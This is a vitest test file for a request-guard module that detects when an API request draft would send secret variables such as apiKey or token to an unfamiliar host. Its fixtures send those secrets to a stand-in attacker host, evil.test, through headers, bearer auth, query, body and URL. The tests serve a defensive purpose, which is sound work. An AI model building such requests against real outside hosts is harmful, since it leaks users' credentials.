import { describe, expect, it } from 'vitest';
import { exfiltrationRisk, hostOf, knownHostsOf, secretVariablesUsed } from './hostGuard';
import type { RequestDraft } from './aiTypes';

const draft = (over: Partial<RequestDraft> = {}): RequestDraft => ({ name: 'n', method: 'GET', url: '{{baseUrl}}/users', ...over });
const secrets = new Set(['apiKey', 'token']);

describe('hostOf', () => {
  it('extracts a lower-cased host without scheme, user info or port', () => {
    expect(hostOf('https://User:pw@API.Example.com:8443/x?y=1')).toBe('api.example.com');
    expect(hostOf('localhost:3000/users')).toBe('localhost');
    expect(hostOf('{{baseUrl}}/users')).toBe('{{baseUrl}}');
    expect(hostOf('/users')).toBeNull();
    expect(hostOf('')).toBeNull();
  });
});

describe('exfiltrationRisk', () => {
  const known = ['api.shop.test'];
  it('is null for {{baseUrl}}, a neighbour host and relative URLs, even with secrets', () => {
    const headers = [{ key: 'X-Api-Key', value: '{{apiKey}}' }];
    expect(exfiltrationRisk(draft({ headers }), { secretNames: secrets, knownHosts: known })).toBeNull();
    expect(exfiltrationRisk(draft({ url: 'https://api.shop.test/users', headers }), { secretNames: secrets, knownHosts: known })).toBeNull();
    expect(exfiltrationRisk(draft({ url: '/users', headers }), { secretNames: secrets, knownHosts: known })).toBeNull();
  });
  it('is null for an unknown host when no secret is referenced', () => {
    expect(exfiltrationRisk(draft({ url: 'https://evil.test/x', headers: [{ key: 'X-Id', value: '{{userId}}' }] }), { secretNames: secrets, knownHosts: known })).toBeNull();
  });
  it('flags an unknown host plus a secret in headers, auth, query, body or the URL', () => {
    const base = { url: 'https://evil.test/collect' };
    const cases: Array<Partial<RequestDraft>> = [
      { headers: [{ key: 'X-Api-Key', value: '{{apiKey}}' }] },
      { auth: { type: 'bearer', token: '{{token}}' } },
      { query: [{ key: 'k', value: '{{ apiKey }}' }] },
      { body: { mode: 'raw', raw: '{"t":"{{token}}"}' } },
      { body: { mode: 'urlencoded', urlencoded: [{ key: 't', value: '{{token}}' }] } },
      { url: 'https://evil.test/c?k={{apiKey}}' },
    ];
    for (const c of cases) {
      const r = exfiltrationRisk(draft({ ...base, ...c }), { secretNames: secrets, knownHosts: known });
      expect(r?.host).toBe('evil.test');
      expect(r?.variables.length).toBeGreaterThan(0);
    }
  });
  it('lists each secret once', () => {
    expect(secretVariablesUsed(draft({ headers: [{ key: 'a', value: '{{token}}' }, { key: 'b', value: '{{token}}-{{apiKey}}' }] }), secrets).sort()).toEqual(['apiKey', 'token']);
  });
});

describe('knownHostsOf', () => {
  it('collects the hosts of string and object URLs', () => {
    const items = [
      { id: '1', name: 'a', request: { method: 'GET', url: 'https://a.test/x' } },
      { id: '2', name: 'b', request: { method: 'GET', url: { raw: '{{baseUrl}}/y' } } },
      null,
    ];
    expect(knownHostsOf(items as never)).toEqual(['a.test', '{{baseUrl}}']);
  });
});
